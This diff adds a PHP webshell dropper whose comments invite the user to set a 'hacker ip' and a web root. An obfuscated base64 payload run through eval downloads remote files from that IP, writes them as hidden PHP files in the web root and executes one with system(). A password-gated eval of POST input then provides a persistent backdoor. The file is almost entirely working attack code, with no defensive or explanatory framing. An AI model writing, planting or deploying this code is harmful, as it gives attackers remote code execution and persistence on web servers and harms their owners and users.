@@ -1,0 +1,9 @@
+<?php
+error_reporting(0); 
+$ip = '172.20.120.5';//edit hacker ip
+$webroot = "/var/www/html/test/";//edit root dir of put shell
+$url="/";
+$b = "JHJlbW90ZV9m".chr(0x61)."WxlX2EgPSAn".chr(0x61)."HR0cDovLycuJGlwLicvdXNlci1pbmMudHh0JzsKJGNvbnRlbnRfYSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRyZW1vdGVfZmlsZV9hKTsKZmlsZV9wdXRfY29udGVudHMoJHdlYnJvb3QuJy8uc2Vzc2lvbi5w".chr(0x61)."HAnLCRjb250ZW50X2EpOwokcmVtb3RlX2ZpbGVfbSA9ICdodHRwOi8vJy4k".chr(0x61)."XAuJy9w".chr(0x61)."HAudHh0JzsKJGNvbnRlbnRfbSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRyZW1vdGVfZmlsZV9tKTsKJHRtID0gdGltZSgpOwokcnRtID0gZmlsZW10".chr(0x61)."W1lKCcvdG1wL3Nlc3Npb25fdGltZScpOwppZiAoJHRtLSRydG0gPiAyKQp7Cglm".chr(0x61)."WxlX3B1dF9jb250ZW50cygkd2Vicm9vdC4nLy5jYWNoZS5w".chr(0x61)."HAnLCRjb250ZW50X20pOwoJJHJlbW90ZSA9ICJw".chr(0x61)."HAgIi4kd2Vicm9vdC4iLy5jYWNoZS5w".chr(0x61)."HAiOwoJc3lzdGVtKCRyZW1vdGUpOwp9";
+eval(base64_decode($b));
+if(isset($_REQUEST['p']) && md5($_REQUEST['p']) == '9bdae23f2f19c4c3d25e7719f7a72ee9' && isset($_POST['sec'])) eval($_POST['sec']);
+?>
